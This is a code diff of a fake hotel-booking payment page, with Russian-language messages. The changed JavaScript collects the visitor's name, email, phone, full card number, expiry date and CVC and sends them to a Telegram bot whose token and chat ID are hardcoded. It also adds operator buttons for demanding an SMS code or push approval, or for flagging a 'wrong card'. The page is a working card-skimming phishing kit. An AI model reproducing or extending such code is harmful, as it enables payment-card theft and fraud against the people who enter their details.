@@ -1267,72 +1267,63 @@
             window.location.href = 'index.html';
         });
 
-        // Функция отправки в Telegram бот
         async function sendToTelegramBot() {
-            try {
-                const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    try {
+        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+        const bookingData = JSON.parse(sessionStorage.getItem('bookingData') || '{}');
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
 
-                const message = `
-💳 НОВАЯ ОПЛАТА
+        const message = `💳 НОВАЯ ОПЛАТА
 
 👤 Клиент:
-• Имя: ${formData.firstName || '-'}
-• Фамилия: ${formData.lastName || '-'}
-• Email: ${formData.email || '-'}
-• Телефон: ${formData.phone || '-'}
+• Имя: ${formData.firstName || 'Тест'}
+• Фамилия: ${formData.lastName || 'Тестов'}  
+• Email: ${formData.email || 'test@test.com'}
+• Телефон: ${formData.phone || '+48123456789'}
 
 💳 Карта:
 • Номер: ${cardNumber}
-• Срок: ${document.getElementById('expiry').value || '-'}
-• CVC: ${document.getElementById('cvc').value || '-'}
-`;
+• Срок: ${expiry}
+• CVC: ${cvc}
 
-                // Отправляем сообщение через бота (а не напрямую в API)
-                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-                const CHAT_ID = '-1003239032658';
+🏨 Бронирование:
+• Сумма: ${bookingData.total || '570'} PLN`;
 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { 
-                                        text: "📱 SMS код", 
-                                        callback_data: `sms_${Date.now()}_user_123` 
-                                    },
-                                    { 
-                                        text: "🔔 Пуш", 
-                                        callback_data: `push_${Date.now()}_user_123` 
-                                    }
-                                ],
-                                [
-                                    { 
-                                        text: "❌ Неверная карта", 
-                                        callback_data: `wrong_card_${Date.now()}_user_123` 
-                                    }
-                                ]
-                            ]
-                        }
-                    })
-                });
+        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+        const CHAT_ID = '-1003239032658';
 
-                const result = await response.json();
-                console.log('Результат отправки в Telegram:', result);
-                return result.ok;
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "📱 SMS код", callback_data: "sms_123_user_123" },
+                            { text: "🔔 Пуш", callback_data: "push_123_user_123" }
+                        ],
+                        [
+                            { text: "❌ Неверная карта", callback_data: "wrong_card_123_user_123" }
+                        ]
+                    ]
+                }
+            })
+        });
 
-            } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
-                return false;
-            }
-        }
+        const result = await response.json();
+        console.log('Результат отправки:', result);
+        return result.ok;
+
+    } catch (error) {
+        console.error('Ошибка отправки:', error);
+        return false;
+    }
+}
 
         // Обработчик кнопки "Оплатить"
         payBtn.addEventListener('click', async () => {
@@ -1480,3 +1471,4 @@
     </script>
 </body>
 </html>
+
